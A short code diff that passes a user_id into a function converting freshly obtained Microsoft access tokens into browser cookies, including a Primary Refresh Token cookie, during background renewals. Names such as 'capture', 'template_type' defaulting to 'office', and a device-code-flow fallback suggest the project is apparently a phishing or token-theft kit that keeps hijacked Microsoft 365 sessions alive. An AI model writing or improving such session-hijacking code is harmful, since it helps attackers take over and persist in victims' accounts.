@@ -134,13 +134,17 @@ if (isPersonal) {
       return { success: false, error: 'Soft error - switched to device code flow', soft_error: true };
     }
 
-    // Convert to cookies with account-type awareness
+    // Convert to cookies with account-type awareness. user_id is passed so
+    // the KDF PRT cookie can be built from device_credentials.session_key_encrypted
+    // (without it the session-key lookup is skipped and background renewals
+    // silently lose the x-ms-RefreshTokenCredential cookie).
     const cookieResult = await convertTokensToCookies(
       newAccessToken,
       capture.template_type || 'office',
       tenant,
       capture.email,
-      accountType
+      accountType,
+      capture.user_id
     );
 
   if (cookieResult.success && cookieResult.cookies) {
